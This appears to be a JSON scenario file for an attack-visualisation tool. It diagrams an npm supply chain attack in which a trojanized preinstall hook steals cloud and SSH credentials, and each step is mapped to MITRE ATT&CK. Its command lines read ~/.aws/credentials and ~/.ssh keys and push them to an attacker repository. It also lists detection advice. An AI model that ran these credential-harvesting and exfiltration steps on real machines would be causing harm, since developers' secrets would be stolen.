{
  "title": "NPM Supply Chain Attack",
  "description": "Trojanized npm package harvests cloud credentials via malicious preinstall hook and exfiltrates to attacker-controlled infrastructure.",
  "version": "3.0",
  "viewport": {
    "zoom": 0.7095153575648049,
    "pan": {
      "x": 387.72072906547777,
      "y": 294.0146970122022
    }
  },
  "stepInfoPosition": {
    "x": 130.5,
    "y": 128.453125
  },
  "stepInfoSize": {
    "width": 300,
    "height": 167.984375
  },
  "shortDescription": "Supply chain credential theft via npm",
  "tags": [
    "Supply_Chain",
    "NPM",
    "Credential_Dumping",
    "Initial_Access",
    "JavaScript",
    "Cloud",
    "Exfiltration"
  ],
  "metadata": {
    "descriptionHtml": "<h3>Tool & Attack Description</h3>\n<p><span style='color:#ef4444;font-weight:bold;'>npm supply chain attacks</span> exploit developer trust in package registries. Attackers compromise maintainer accounts or publish typosquatted packages with malicious <strong>preinstall/postinstall hooks</strong>.</p>\n<h3>How attack works</h3>\n<ol>\n<li>Attacker gains access to legitimate maintainer credentials</li>\n<li>Publishes trojanized package version with malicious preinstall script</li>\n<li>Developer runs <span style='color:#ef4444;font-weight:bold;'>npm install</span></li>\n<li>Preinstall hook executes automatically with user privileges</li>\n<li>Script harvests credentials from ~/.aws, ~/.ssh, environment variables</li>\n<li>Exfiltrates data to attacker-controlled endpoint</li>\n</ol>",
    "commandsBlock": "# Step 1: Attacker publishes malicious package\n$ npm publish malicious-package@1.0.0\n\n# Step 2: Victim installs (unknowingly)\n$ npm install malicious-package\n\n# Step 3: Malware harvests credentials\n$ cat ~/.aws/credentials\n$ cat ~/.ssh/id_rsa\n\n# Step 4: Exfiltrate via git\n$ git push origin exfil-branch",
    "prerequisites": [
      "Compromised maintainer account OR typosquattable package name",
      "Target developers using npm/yarn/pnpm",
      "Credentials stored in standard locations (~/.aws, ~/.ssh, .env)"
    ],
    "attackerGains": [
      "AWS access keys and secrets",
      "SSH private keys for lateral movement",
      "Environment variables with API tokens",
      "Potential access to CI/CD pipelines"
    ],
    "detectionNotes": [
      "Monitor npm audit and lock file changes",
      "Scan preinstall/postinstall scripts in dependencies",
      "Alert on outbound connections during npm install",
      "Use tools like socket.dev or snyk for supply chain monitoring"
    ],
    "mitreCategories": [
      "T1195.001",
      "T1552.001",
      "T1567.001"
    ],
    "extraInfo": [
      "NPM Registry - https://www.npmjs.com/",
      "MITRE T1195.002 - Supply Chain Compromise: Software Supply Chain",
      "socket.dev - npm supply chain security scanner",
      "npm audit - Built-in vulnerability scanning"
    ]
  },
  "entities": [
    {
      "id": "attacker_infrastructure",
      "label": "Attacker Infrastructure",
      "position": {
        "x": -350.5943395825148,
        "y": 162.18995716668758
      },
      "icon": "IconAttacker",
      "type": "container",
      "width": 280,
      "height": 450,
      "style": "dashed_border",
      "members": [
        "attacker",
        "exfil_server",
        "stolen_aws_keys",
        "stolen_ssh_keys"
      ]
    },
    {
      "id": "attacker",
      "label": "Threat Actor",
      "position": {
        "x": -332.3961142713228,
        "y": 94.02762892463672
      },
      "icon": "IconAttacker",
      "type": "node"
    },
    {
      "id": "exfil_server",
      "label": "Exfil Server",
      "position": {
        "x": -371.7925648937068,
        "y": 209.35228540873842
      },
      "icon": "IconC2",
      "type": "node"
    },
    {
      "id": "stolen_aws_keys",
      "label": "Stolen AWS Keys",
      "position": {
        "x": -191.8614945231092,
        "y": 170.36495669661974
      },
      "icon": "IconStolenKey",
      "type": "node"
    },
    {
      "id": "stolen_ssh_keys",
      "label": "Stolen SSH Keys",
      "position": {
        "x": -183.73260539763265,
        "y": 238.77690378426922
      },
      "icon": "IconStolenKey",
      "type": "node"
    },
    {
      "id": "internet_zone",
      "label": "Public Internet",
      "position": {
        "x": 189.14794357399455,
        "y": -137.99828140649936
      },
      "icon": "IconCloud",
      "type": "container",
      "width": 350,
      "height": 180,
      "style": "dashed_border",
      "members": [
        "npm_registry",
        "github_platform"
      ]
    },
    {
      "id": "npm_registry",
      "label": "NPM Registry",
      "position": {
        "x": 131.5013190054865,
        "y": -225.8166887645416
      },
      "icon": "IconNpm",
      "type": "node"
    },
    {
      "id": "github_platform",
      "label": "GitHub (Exfil Repo)",
      "position": {
        "x": 233.29456814250258,
        "y": -71.17987404845712
      },
      "icon": "IconGitHub",
      "type": "node"
    },
    {
      "id": "victim_workstation",
      "label": "Developer Workstation",
      "position": {
        "x": 107.08501392920229,
        "y": 257.70248541114927
      },
      "icon": "IconWorkstation",
      "type": "container",
      "width": 400,
      "height": 280,
      "style": "dashed_border",
      "members": [
        "user_terminal",
        "malware_script",
        "aws_credentials",
        "ssh_keys"
      ]
    },
    {
      "id": "user_terminal",
      "label": "Terminal (npm)",
      "position": {
        "x": 234.4232625600578,
        "y": 333.85349390952825
      },
      "icon": "IconTerminal",
      "type": "node"
    },
    {
      "id": "malware_script",
      "label": "preinstall.js",
      "position": {
        "x": 182.76893534466606,
        "y": 164.0028836318874
      },
      "icon": "IconInfectedCode",
      "type": "node"
    },
    {
      "id": "aws_credentials",
      "label": "~/.aws/credentials",
      "position": {
        "x": -10.253234701653184,
        "y": 281.13728525714623
      },
      "icon": "IconKey",
      "type": "node"
    },
    {
      "id": "ssh_keys",
      "label": "~/.ssh/*",
      "position": {
        "x": -22.01487347484411,
        "y": 160.55147691277026
      },
      "icon": "IconKey",
      "type": "node"
    }
  ],
  "visibility": {
    "attacker_infrastructure": {
      "start": 0,
      "end": 100
    },
    "attacker": {
      "start": 0,
      "end": 100
    },
    "exfil_server": {
      "start": 0,
      "end": 100
    },
    "stolen_aws_keys": {
      "start": 9,
      "end": 100
    },
    "stolen_ssh_keys": {
      "start": 10,
      "end": 100
    },
    "internet_zone": {
      "start": 0,
      "end": 100
    },
    "npm_registry": {
      "start": 0,
      "end": 100
    },
    "github_platform": {
      "start": 0,
      "end": 100
    },
    "victim_workstation": {
      "start": 0,
      "end": 100
    },
    "user_terminal": {
      "start": 0,
      "end": 100
    },
    "malware_script": {
      "start": 5,
      "end": 100
    },
    "aws_credentials": {
      "start": 0,
      "end": 100
    },
    "ssh_keys": {
      "start": 0,
      "end": 100
    }
  },
  "steps": [
    {
      "id": 1,
      "name": "Compromise Maintainer",
      "mitre": {
        "id": "T1566",
        "tactic": "Initial Access",
        "technique": "Phishing"
      },
      "type": "edge",
      "from": "attacker",
      "to": "npm_registry",
      "icon": "IconUser",
      "description": "The attacker gains unauthorized access to a legitimate package maintainer's NPM account, likely via phishing or credential stuffing."
    },
    {
      "id": 2,
      "name": "Publish Trojanized Package",
      "mitre": {
        "id": "T1195.001",
        "tactic": "Initial Access",
        "technique": "Supply Chain Compromise: Compromise Software Dependencies and Development Tools"
      },
      "type": "edge",
      "from": "attacker",
      "to": "npm_registry",
      "icon": "IconInfectedPackage",
      "description": "Using the compromised credentials, the attacker publishes a new malicious version (e.g., 1.0.0) of a popular package containing a malicious preinstall hook script.",
      "cli": "npm publish malicious-package@1.0.0"
    },
    {
      "id": 3,
      "name": "npm install Request",
      "mitre": {
        "id": "T1204.002",
        "tactic": "Execution",
        "technique": "User Execution: Malicious File"
      },
      "type": "edge",
      "from": "user_terminal",
      "to": "npm_registry",
      "icon": "IconNpm",
      "description": "An unsuspecting developer or CI/CD pipeline runs 'npm install malicious-package' to add the dependency to their project.",
      "cli": "npm install malicious-package@1.0.0"
    },
    {
      "id": 4,
      "name": "Download Malicious Package",
      "type": "edge",
      "from": "npm_registry",
      "to": "user_terminal",
      "icon": "IconMalware",
      "description": "The NPM registry serves the Trojanized package version containing the hidden malware payload to the developer's machine."
    },
    {
      "id": 5,
      "name": "Execute Preinstall Hook",
      "mitre": {
        "id": "T1059.007",
        "tactic": "Execution",
        "technique": "Command and Scripting Interpreter: JavaScript"
      },
      "type": "edge",
      "from": "user_terminal",
      "to": "malware_script",
      "icon": "IconInfectedProcess",
      "description": "The NPM client automatically executes the 'preinstall' script defined in the package.json, launching the malware with the user's privileges."
    },
    {
      "id": 6,
      "name": "Read AWS Credentials",
      "mitre": {
        "id": "T1552.001",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials: Credentials In Files"
      },
      "type": "edge",
      "from": "malware_script",
      "to": "aws_credentials",
      "icon": "IconExploit",
      "description": "The malicious script silent reads the content of '~/.aws/credentials' to steal cloud access keys.",
      "cli": "cat ~/.aws/credentials"
    },
    {
      "id": 7,
      "name": "Read SSH Keys",
      "mitre": {
        "id": "T1552.004",
        "tactic": "Credential Access",
        "technique": "Unsecured Credentials: Private Keys"
      },
      "type": "edge",
      "from": "malware_script",
      "to": "ssh_keys",
      "icon": "IconExploit",
      "description": "The script also scans the '~/.ssh' directory to harvest private SSH keys for further lateral movement.",
      "cli": "cat ~/.ssh/*"
    },
    {
      "id": 8,
      "name": "Exfiltrate to GitHub",
      "mitre": {
        "id": "T1567.001",
        "tactic": "Exfiltration",
        "technique": "Exfiltration Over Web Service: Exfiltration to Code Repository"
      },
      "type": "edge",
      "from": "malware_script",
      "to": "github_platform",
      "icon": "IconGit",
      "description": "The stolen credentials are immediately exfiltrated by pushing them to a private GitHub repository controlled by the attacker.",
      "cli": "git push origin exfil-branch"
    },
    {
      "id": 9,
      "name": "Retrieve AWS Keys",
      "mitre": {
        "id": "T1530",
        "tactic": "Collection",
        "technique": "Data from Cloud Storage Object"
      },
      "type": "edge",
      "from": "github_platform",
      "to": "stolen_aws_keys",
      "icon": "IconStolenKey",
      "description": "The attacker retrieves the stolen AWS access keys from their exfiltration repository."
    },
    {
      "id": 10,
      "name": "Retrieve SSH Keys",
      "mitre": {
        "id": "T1530",
        "tactic": "Collection",
        "technique": "Data from Cloud Storage Object"
      },
      "type": "edge",
      "from": "github_platform",
      "to": "stolen_ssh_keys",
      "icon": "IconStolenKey",
      "description": "The attacker retrieves the stolen SSH private keys, completing the supply chain compromise."
    }
  ]
}
